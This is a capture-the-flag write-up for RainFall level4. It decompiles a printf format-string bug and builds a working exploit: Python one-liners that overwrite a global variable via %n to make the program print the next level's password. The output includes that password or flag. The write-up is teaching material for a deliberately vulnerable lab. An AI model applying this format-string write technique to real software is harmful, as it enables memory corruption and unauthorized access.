## Basic analysis
There is **level4** binary waiting for us, as in previous level. When examined, it apparently doeas the same thing as in the level3:
~~~shell
./level4
42 let me pass
42 let me pass
~~~
Waits for stdin and prints it back. Let's use **Ghidra** again to look inside:
~~~C
void main(void)

{
  n();
  return;
}

void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void p(char *param_1)

{
  printf(param_1);
  return;
}
~~~
As we can see, the program does the same thing as in level3, just using one more function to print the output. There is still the variable **m**
waiting to be compared to **16930116**. It is at the **0x08049810** memory position.

## Format string attack
We will do format strimg attack again, we just use another formatter as the value of 16930116 is too long. It will be the **%d**, that let us do
dynamic field with setting - like that: **%16930116d**. The rest will be the same as in level3:

**Step 1**: Find the position in the stack:
~~~shell
level4@RainFall:~$ python -c 'print "AAAA" + " %x" * 20' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit - | ./level4
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
~~~
Found on 12th position.

**Step 2**: Payload construction: 
1. memory address of m
2. formatter minus four bytes for memaddress of m + positioning on 12 position in stack: **%16930112d%12$n**
~~~shell
level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' > /tmp/flag4
level4@RainFall:~$ cat /tmp/flag4 | ./level4
[...]
                                       -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
~~~

~~~
